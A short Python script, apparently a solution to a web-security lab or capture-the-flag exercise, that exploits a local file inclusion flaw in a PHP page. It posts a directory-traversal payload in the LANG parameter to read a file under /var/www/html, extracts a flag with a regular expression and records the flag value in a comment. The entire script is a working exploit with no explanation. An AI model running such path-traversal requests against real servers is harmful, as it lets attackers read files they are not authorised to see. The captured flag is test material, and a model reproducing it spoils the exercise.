import requests
import re
request_url="http://www.wsb.com/Assignment2/case25.php"
payload_data={"LANG":"../../../../../../../../../var/www/html/Assignment2/lfi.txt"}
r=requests.post(request_url,data=payload_data)
re_result=re.findall("The flag is (.*)",r.text)
print("The flag is:"+re_result[0])
print("The payload is:",payload_data)
#The flag is urF8uDT7HnnFZTd
